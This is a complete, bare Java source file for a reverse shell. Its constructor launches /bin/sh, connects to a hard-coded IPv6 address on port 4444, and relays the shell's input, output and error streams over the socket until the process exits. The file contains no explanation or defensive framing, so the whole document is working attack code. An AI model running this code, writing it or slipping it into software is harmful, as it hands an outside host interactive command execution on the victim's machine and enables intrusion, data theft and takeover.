import java.io.*;
import java.net.*;
public class C {
	public C() throws Exception {
		String cmd="/bin/sh";
		Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
		Socket s=new Socket("2409:4071:2188:af59:2534:8d51:2cef:4df2",4444);
		InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
		OutputStream po=p.getOutputStream(),so=s.getOutputStream();
		while(!s.isClosed()) {
			while(pi.available()>0)
				so.write(pi.read());
			while(pe.available()>0)
				so.write(pe.read());
			while(si.available()>0)
				po.write(si.read());
			so.flush();
			po.flush();
			Thread.sleep(50);
			try {
				p.exitValue();
				break;
			}
			catch (Exception e){
			}
		};
		p.destroy();
		s.close();
	}
	public static void main(String args[])throws Exception{
		new C();
	}
}
